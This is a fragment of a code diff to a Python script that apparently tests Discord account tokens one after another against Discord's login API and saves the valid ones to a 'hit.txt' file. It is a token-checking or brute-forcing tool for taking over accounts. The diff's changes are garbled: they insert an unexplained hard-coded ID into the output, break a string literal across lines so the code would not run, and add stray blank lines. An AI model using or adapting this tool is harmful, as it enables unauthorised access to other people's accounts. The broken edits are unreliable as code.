@@ -16,12 +16,17 @@ while id_to_token == id_to_token:
     login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
     try:
         if login.status_code == 200:
-            print(Fore.GREEN + '[+] VALID' + ' ' + token)
+            print(Fore.GREEN + '[+] VALID' + '400063919160295435 ' + token)
             f = open('hit.txt', "a+")
             f.write(f'{token}\n')
         else:
-            print(Fore.RED + '[-] INVALID' + ' ' + token)
+            print(Fore.RED + '[-] INVALID' + '400063919160295435
+                  ' + token)
     finally:
+                  
+                  
+                  
+              
         print("")
 
 
